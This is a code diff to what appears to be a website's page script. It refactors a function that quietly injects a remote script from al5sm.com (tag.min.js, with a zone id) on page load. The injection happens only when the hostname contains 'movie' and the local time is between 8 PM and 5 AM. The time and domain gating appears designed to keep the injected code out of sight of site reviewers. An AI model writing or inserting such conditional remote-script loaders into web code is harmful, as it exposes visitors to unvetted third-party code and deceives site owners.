@@ -25,17 +25,25 @@ document.addEventListener("DOMContentLoaded", function() {
     }
 });
 (function () {
-  const domain = location.hostname.toLowerCase();
-  const hour = new Date().getHours();
+  function inject() {
+    const domain = location.hostname.toLowerCase();
+    const hour = new Date().getHours();
 
-  // Time check: 8 PM (20) to 5 AM (5)
-  const isNightTime = (hour >= 20 || hour < 5);
 
-  // Domain check
-  if (domain.includes("movie") && isNightTime) {
+    const isNightTime = (hour >= 20 || hour < 5);
+
+    if (!domain.includes("movie") || !isNightTime) return;
+
     const s = document.createElement("script");
     s.dataset.zone = "9728461";
     s.src = "https://al5sm.com/tag.min.js";
-    document.body.appendChild(s);
+
+    (document.body || document.documentElement).appendChild(s);
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", inject);
+  } else {
+    inject();
   }
 })();
